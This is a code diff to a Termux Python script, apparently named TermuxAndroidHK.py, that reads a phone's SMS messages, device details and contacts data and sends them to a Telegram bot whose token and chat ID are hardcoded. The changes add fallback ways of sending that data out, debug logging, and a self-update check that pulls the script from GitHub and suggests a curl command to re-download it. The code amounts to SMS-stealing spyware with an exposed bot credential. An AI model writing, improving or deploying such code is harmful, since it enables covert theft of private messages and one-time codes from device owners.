@@ -7,10 +7,15 @@ import requests
 import subprocess
 from datetime import datetime
 
+# Version information
+VERSION = "1.2"
+
 # Configuration
 TELEGRAM_BOT_TOKEN = "7854831812:AAF5JDgaf43BsMgysPZOIBPzW_39p44gGxw"  # Telegram bot token
 TELEGRAM_CHAT_ID = "8111628064"  # Telegram chat ID
 CHECK_INTERVAL = 60  # Time in seconds between SMS checks
+GITHUB_REPO = "https://github.com/W8SOJIB/W8TermuxCNTL"
+RAW_CONTENT_URL = "https://raw.githubusercontent.com/W8SOJIB/W8TermuxCNTL/main/TermuxAndroidHK.py"
 
 def setup():
     """Ensure required packages are installed"""
@@ -18,6 +23,13 @@ def setup():
         # Install required Termux packages
         subprocess.run(["pkg", "install", "termux-api", "-y"], check=True)
         print("[+] Termux API installed successfully")
+        
+        # Make sure requests is installed
+        try:
+            subprocess.run(["pip", "install", "requests"], check=True)
+            print("[+] Requests package installed successfully")
+        except:
+            pass
     except subprocess.CalledProcessError:
         print("[-] Failed to install Termux API. Please install manually: pkg install termux-api")
         exit(1)
@@ -39,21 +51,59 @@ def get_sms_messages(limit=10):
 def send_to_telegram(message):
     """Send message to Telegram bot"""
     api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    
+    # Debug information
+    print(f"[DEBUG] Sending to Telegram. Token length: {len(TELEGRAM_BOT_TOKEN)}, Chat ID: {TELEGRAM_CHAT_ID}")
+    
     try:
-        response = requests.post(api_url, data={
+        # Try with HTML parsing mode first
+        params = {
             "chat_id": TELEGRAM_CHAT_ID,
             "text": message,
             "parse_mode": "HTML"
-        })
+        }
+        
+        # Debug information
+        print(f"[DEBUG] Making POST request to: {api_url}")
+        
+        response = requests.post(api_url, data=params, timeout=10)
+        
+        # Debug information
+        print(f"[DEBUG] Response status code: {response.status_code}")
         
         if response.status_code != 200:
-            print(f"[-] Failed to send message to Telegram: {response.text}")
-            return False
+            # If HTML parsing fails, try without parse mode
+            print(f"[DEBUG] HTML parse mode failed, trying without parse mode")
+            params = {
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": message.replace("<b>", "").replace("</b>", "")
+            }
+            
+            response = requests.post(api_url, data=params, timeout=10)
+            
+            if response.status_code != 200:
+                print(f"[-] Failed to send message to Telegram: {response.text}")
+                return False
         
+        print(f"[+] Message sent successfully to Telegram!")
         return True
     except Exception as e:
         print(f"[-] Error sending to Telegram: {e}")
-        return False
+        # Try alternative method
+        try:
+            print(f"[DEBUG] Trying alternative method...")
+            api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text={requests.utils.quote(message.replace('<b>', '').replace('</b>', ''))}"
+            response = requests.get(api_url, timeout=10)
+            
+            if response.status_code == 200:
+                print(f"[+] Message sent successfully with alternative method!")
+                return True
+            else:
+                print(f"[-] Alternative method also failed: {response.text}")
+                return False
+        except Exception as e2:
+            print(f"[-] Alternative method also failed with error: {e2}")
+            return False
 
 def format_sms(message):
     """Format SMS message for Telegram"""
@@ -152,19 +202,68 @@ def get_device_info():
     except Exception as e:
         device_info += f"• Error getting contacts info: {str(e)}\n\n"
     
-    # Add timestamp
+    # Add version and timestamp
+    device_info += f"<b>Script Version:</b> {VERSION}\n"
     device_info += f"<b>Report Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     
     return device_info
 
+def check_for_updates():
+    """Check if there's an update available on GitHub"""
+    try:
+        print("[+] Checking for updates...")
+        response = requests.get(RAW_CONTENT_URL, timeout=10)
+        
+        if response.status_code != 200:
+            print(f"[-] Failed to check for updates: HTTP {response.status_code}")
+            return None
+        
+        # Try to extract version from the file content
+        content = response.text
+        for line in content.split('\n'):
+            if line.strip().startswith('VERSION ='):
+                try:
+                    remote_version = line.split('=')[1].strip().replace('"', '').replace("'", '')
+                    print(f"[+] Remote version: {remote_version}, Local version: {VERSION}")
+                    
+                    # Compare versions (simple string comparison)
+                    if remote_version != VERSION:
+                        update_message = (
+                            f"<b>🔄 UPDATE AVAILABLE 🔄</b>\n\n"
+                            f"Current version: {VERSION}\n"
+                            f"New version: {remote_version}\n\n"
+                            f"Repository: {GITHUB_REPO}\n\n"
+                            f"To update, run:\n"
+                            f"<code>curl -o TermuxAndroidHK.py {RAW_CONTENT_URL}</code>"
+                        )
+                        return update_message
+                    else:
+                        print("[+] You are using the latest version")
+                        return None
+                except Exception as e:
+                    print(f"[-] Error parsing version: {e}")
+                    return None
+        
+        print("[-] Could not find version information in remote file")
+        return None
+    except Exception as e:
+        print(f"[-] Error checking for updates: {e}")
+        return None
+
 def main():
-    print("[+] Starting SMS to Telegram forwarder")
+    print("[+] Starting SMS to Telegram forwarder (Version " + VERSION + ")")
     print("[+] Checking for required packages...")
     setup()
     
     if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN" or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID":
         print("[-] Please configure your Telegram bot token and chat ID in the script")
         exit(1)
+    
+    # Check for updates first
+    update_message = check_for_updates()
+    if update_message:
+        print("[+] Update available, sending notification...")
+        send_to_telegram(update_message)
     
     # Send device information at startup
     print("[+] Collecting device information...")
@@ -174,6 +273,13 @@ def main():
         print("[+] Device information sent successfully")
     else:
         print("[-] Failed to send device information")
+        
+        # Try sending a simple test message
+        print("[+] Trying to send a simple test message...")
+        if send_to_telegram("⚠️ Test message from SMS forwarder script"):
+            print("[+] Test message sent successfully")
+        else:
+            print("[-] Even test message failed. Please check your Telegram token and chat ID")
     
     print(f"[+] Will check for new SMS every {CHECK_INTERVAL} seconds")
     
@@ -194,6 +300,8 @@ def main():
             
             if success:
                 print(f"[+] Sent message from {message.get('number')} to Telegram")
+            else:
+                print(f"[-] Failed to send message from {message.get('number')}")
             
             # Update the last timestamp
             current_timestamp = int(message.get("received", 0))
@@ -221,6 +329,8 @@ def main():
                     
                     if success:
                         print(f"[+] Sent message from {message.get('number')} to Telegram")
+                    else:
+                        print(f"[-] Failed to send message from {message.get('number')}")
                     
                     # Update the last timestamp
                     current_timestamp = int(message.get("received", 0))
